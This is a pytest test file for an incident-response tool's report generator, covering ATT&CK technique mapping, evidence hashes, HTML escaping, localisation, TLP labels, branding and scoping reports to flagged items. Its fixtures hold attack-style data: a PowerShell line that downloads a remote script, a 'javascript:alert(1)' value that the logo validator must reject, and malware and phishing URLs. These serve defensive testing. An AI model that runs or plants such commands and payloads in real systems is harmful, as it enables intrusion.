"""Incident report: content, options, branding, HTML and PDF."""

from __future__ import annotations

import base64

from fastapi.testclient import TestClient

from app.report import attack_techniques, build_html, evidence, flagged_scope
from tests.conftest import make_key

LOGO = (
    "data:image/png;base64,"
    + base64.b64encode(
        bytes.fromhex(
            "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489"
            "0000000d4944415478da63f8cfc0f01f0005000201a3b6a6e30000000049454e44ae426082"
        )
    ).decode()
)

DOC = {
    "id": "r1",
    "name": "WKS-042",
    "host": "WKS-042",
    "username": "m.rossi",
    "os": "windows",
    "createdAt": "2026-03-01T08:00:00Z",
    "suspiciousStart": 1772503200000,
    "suspiciousEnd": 1772510400000,
    "flags": {
        "evt:Security:9126": {
            "key": "evt:Security:9126",
            "section": "eventlogs",
            "browserId": "Security",
            "title": "1102 Audit log cleared — cleared by <administrator>",
            "time": 1772505660000,
            "flaggedBy": "analyst",
            "comments": [{"text": "anti-forensics", "author": "analyst"}],
        }
    },
    "notes": [{"id": "n1", "text": "Initial access via RDP.\n\nSecond paragraph.", "author": "analyst"}],
    "data": {
        "commands": {
            "shells": {
                "powershell": {
                    "commands": [{"command": "iwr http://185.220.101.47/a.ps1"}],
                    "meta": {
                        "history": {
                            "fileName": "ConsoleHost_history.txt",
                            "format": "psreadline",
                            "rows": 1,
                            "importedAt": "2026-03-04T09:00:00Z",
                            "sha256": "d" * 64,
                        }
                    },
                }
            }
        },
        "eventlogs": {
            "channels": {
                "Security": {
                    "events": [{"eventId": 1102, "time": 1772505660000, "data": {}}],
                    "meta": {"fileName": "Security.evtx", "format": "evtx", "sha256": "e" * 64, "total": 9},
                },
                "System": {
                    "events": [
                        {
                            "eventId": 104,
                            "time": 1772505000000,
                            "data": {"Channel": "Microsoft-Windows-Sysmon/Operational"},
                        }
                    ],
                    "meta": {"fileName": "System.evtx", "format": "evtx", "sha256": "f" * 64, "total": 4},
                },
            }
        },
    },
}


def test_attack_techniques_merge_capa_yara_and_rules():
    samples = [
        {
            "fileName": "a.exe",
            "capa": [
                {
                    "name": "inject thread",
                    "attack": [{"id": "T1055", "tactic": "Defense Evasion", "technique": "Process Injection"}],
                }
            ],
            "yara": [{"rule": "pe_process_injection_apis", "meta": {"mitre_attack": "T1055"}}],
        }
    ]
    detections = [{"label": "log cleared", "count": 2, "attack": ["T1070.001", "bogus"]}]
    techniques = {t["id"]: t for t in attack_techniques(samples, detections)}
    assert set(techniques) == {"T1055", "T1070.001"}
    assert techniques["T1055"]["sources"] == [
        "capa · inject thread (a.exe)",
        "YARA · pe_process_injection_apis (a.exe)",
    ]
    assert techniques["T1070.001"]["name"] == "Indicator Removal: Clear Windows Event Logs"


def test_evidence_lists_imported_files_with_hashes():
    rows = evidence(DOC)
    assert {(r["fileName"], r["sha256"]) for r in rows} == {
        ("ConsoleHost_history.txt", "d" * 64),
        ("Security.evtx", "e" * 64),
        ("System.evtx", "f" * 64),
    }


def test_build_html_sections_language_and_escaping():
    html = build_html(
        DOC,
        lang="it",
        tlp="red",
        sections=["summary", "timeline", "eventlogs", "notes"],
        executive_summary="Accesso <RDP>.",
        generated_by="admin",
        generated_at="2026-03-05T10:00:00Z",
    )
    assert "Report dell&#x27;incidente" in html and "TLP:RED" in html
    assert "Accesso &lt;RDP&gt;." in html and "<RDP>" not in html
    assert "cleared by &lt;administrator&gt;" in html and "anti-forensics" in html
    assert "Microsoft-Windows-Sysmon/Operational" not in html.split("Registri eventi Windows")[0]
    assert "Second paragraph." in html
    # Left-out sections are absent.
    assert "Appendice delle prove" not in html and "MITRE ATT&amp;CK" not in html


def test_report_endpoint_html_pdf_and_branding(admin: TestClient):
    key = make_key(admin, role="analyst")
    assert admin.post("/api/incidents", headers=key, json=DOC).status_code == 201
    settings = admin.get("/api/settings").json()
    settings["report"] = {"orgName": "ACME SOC", "logo": LOGO}
    assert admin.put("/api/settings", json=settings).json()["report"]["orgName"] == "ACME SOC"
    bad = {**settings, "report": {"orgName": "x", "logo": "javascript:alert(1)"}}
    assert admin.put("/api/settings", json=bad).status_code == 422

    r = admin.post(
        "/api/incidents/r1/report",
        headers=key,
        json={
            "format": "html",
            "detections": [{"id": "evt-log-cleared", "label": "log cleared", "count": 1, "attack": ["T1070.001"]}],
            "scope": "all",
        },
    )
    assert r.status_code == 200 and r.headers["content-type"].startswith("text/html")
    assert "ACME SOC" in r.text and LOGO in r.text and "T1070.001" in r.text
    assert "185.220.101.47" in r.text  # from the IOC index
    assert "everything in the incident" in r.text and "ConsoleHost_history.txt" in r.text
    # By default only what was flagged: the indicator and the PowerShell history are not.
    flagged = admin.post("/api/incidents/r1/report", headers=key, json={"format": "html"})
    assert "what the analysts flagged" in flagged.text and "cleared by" in flagged.text
    assert "185.220.101.47" not in flagged.text and "ConsoleHost_history.txt" not in flagged.text
    assert "Security.evtx" in flagged.text and "System.evtx" not in flagged.text
    assert "TLP:AMBER" in r.text  # default

    # Saved per-incident settings are the defaults; the body overrides them.
    admin.patch(
        "/api/incidents/r1",
        headers=key,
        json={"report": {"lang": "it", "tlp": "green", "executiveSummary": "Sintesi salvata."}},
    )
    r = admin.post("/api/incidents/r1/report", headers=key, json={"format": "html"})
    assert "TLP:GREEN" in r.text and "Sintesi salvata." in r.text and "Report dell" in r.text

    pdf = admin.post("/api/incidents/r1/report", headers=key, json={})
    assert pdf.status_code == 200 and pdf.headers["content-type"] == "application/pdf"
    assert pdf.content.startswith(b"%PDF") and "WKS-042-report.pdf" in pdf.headers["content-disposition"]

    actions = [e["action"] for e in admin.get("/api/audit", headers=key).json()["entries"]]
    assert "report.generate" in actions
    assert admin.post("/api/incidents/nope/report", headers=key, json={}).status_code == 404


SHA_A, SHA_B, MAIL = "a" * 64, "b" * 64, "c" * 64
SCOPED = {
    "id": "r2",
    "name": "scoped",
    "flags": {
        f"sample:{SHA_A}:ioc:url:http://evil.top/gate.php": {"section": "malware", "title": "gate"},
        "ioc:ip:185.220.101.47": {"section": "iocs", "title": "185.220.101.47"},
        "ioc:domain:not-indexed.example": {"section": "iocs", "title": "not-indexed.example"},
        f"mail:{MAIL}": {"section": "mail", "title": "Your account"},
        "pcap:" + "1" * 32 + ":6": {"section": "network", "title": "GET /signin"},
        "url:" + "2" * 32: {"section": "urls", "title": "login-paypa1.top"},
        "cmd-7": {"section": "commands", "browserId": "bash", "title": "curl"},
        "hist-3": {"section": "events", "browserId": "chrome", "title": "visit"},
        "art-1": {"section": "endpoint:execution", "browserId": "execution", "title": "s.exe"},
    },
    "data": {
        "malware": {
            "samples": [
                {"sha256": SHA_A, "fileName": "flagged.exe", "importedAt": "2026-03-04T09:00:00Z"},
                {"sha256": SHA_B, "fileName": "ignored.exe", "importedAt": "2026-03-04T09:00:00Z"},
            ]
        },
        "mail": {"messages": [{"sha256": MAIL, "fileName": "reported.eml", "subject": "Your account"}]},
        "network": {
            "captures": [
                {"id": "1" * 32, "fileName": "flagged.pcapng", "sha256": "9" * 64, "packets": 67},
                {"id": "3" * 32, "fileName": "ignored.pcapng", "sha256": "8" * 64, "packets": 5},
            ]
        },
        "urls": {
            "scans": [
                {"id": "2" * 32, "url": "https://login-paypa1.top/signin", "verdict": "phishing", "score": 90},
                {"id": "4" * 32, "url": "https://ignored.example/", "verdict": "clean", "score": 0},
            ]
        },
        "commands": {
            "shells": {
                "bash": {"meta": {"history": {"fileName": "bash_history", "format": "bash", "sha256": "5" * 64}}},
                "zsh": {"meta": {"history": {"fileName": "zsh_history", "format": "zsh", "sha256": "6" * 64}}},
            }
        },
    },
}


def test_flagged_scope_reads_the_flag_keys():
    scope = flagged_scope(SCOPED)
    assert scope["samples"] == {SHA_A} and scope["mails"] == {MAIL}
    assert scope["captures"] == {"1" * 32} and scope["urls"] == {"2" * 32}
    assert scope["iocs"] == {
        ("url", "http://evil.top/gate.php"),
        ("ip", "185.220.101.47"),
        ("domain", "not-indexed.example"),
    }
    assert scope["shells"] == {"bash"} and scope["browsers"] == {"chrome"} and scope["categories"] == {"execution"}


def test_report_lists_only_what_was_flagged_unless_asked_for_everything():
    samples = [
        {"sha256": SHA_A, "fileName": "flagged.exe", "yara": [], "capa": None},
        {"sha256": SHA_B, "fileName": "ignored.exe", "yara": [], "capa": None},
    ]
    iocs = [
        {"type": "ip", "value": "185.220.101.47", "sources": ["commands:bash"], "otherIncidents": 2},
        {"type": "domain", "value": "never-flagged.example", "sources": ["commands:bash"], "otherIncidents": 0},
    ]
    html = build_html(SCOPED, samples=samples, iocs=iocs, mails=[{"sha256": MAIL, "subject": "Your account"}])
    for shown in ("flagged.exe", "185.220.101.47", "not-indexed.example", "flagged.pcapng", "login-paypa1.top"):
        assert shown in html, shown
    for hidden in ("ignored.exe", "never-flagged.example", "ignored.pcapng", "ignored.example", "zsh_history"):
        assert hidden not in html, hidden
    assert "bash_history" in html and "Your account" in html
    assert "what the analysts flagged" in html

    everything = build_html(SCOPED, samples=samples, iocs=iocs, scope="all")
    for shown in ("ignored.exe", "never-flagged.example", "ignored.pcapng", "ignored.example", "zsh_history"):
        assert shown in everything, shown
    # Nothing flagged: the sections say so instead of listing everything.
    empty = build_html({"id": "r3", "name": "empty", "data": SCOPED["data"]}, samples=samples, iocs=iocs)
    assert "Nothing was flagged here." in empty and "flagged.exe" not in empty
    assert {r["fileName"] for r in evidence(SCOPED, flagged_scope(SCOPED))} == {
        "flagged.exe",
        "reported.eml",
        "flagged.pcapng",
        "bash_history",
    }
